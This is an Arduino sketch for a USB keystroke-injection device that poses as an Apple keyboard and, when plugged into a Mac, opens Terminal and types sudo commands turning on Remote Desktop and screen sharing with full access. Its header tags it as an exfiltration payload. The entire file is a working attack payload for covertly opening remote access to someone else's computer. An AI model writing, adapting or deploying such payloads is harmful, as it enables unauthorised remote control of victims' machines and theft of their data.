#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Enable macOS screen sharing (VNC)
  // Author: Generated
  // Title: Screen Share Toggle
  // Target: macOS
  // Version: 1.0
  // Category: Exfiltration
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("sudo defaults write /Library/Preferences/com.apple.remotedesktop.plist enabled -bool true");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo 'Screen sharing enabled'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}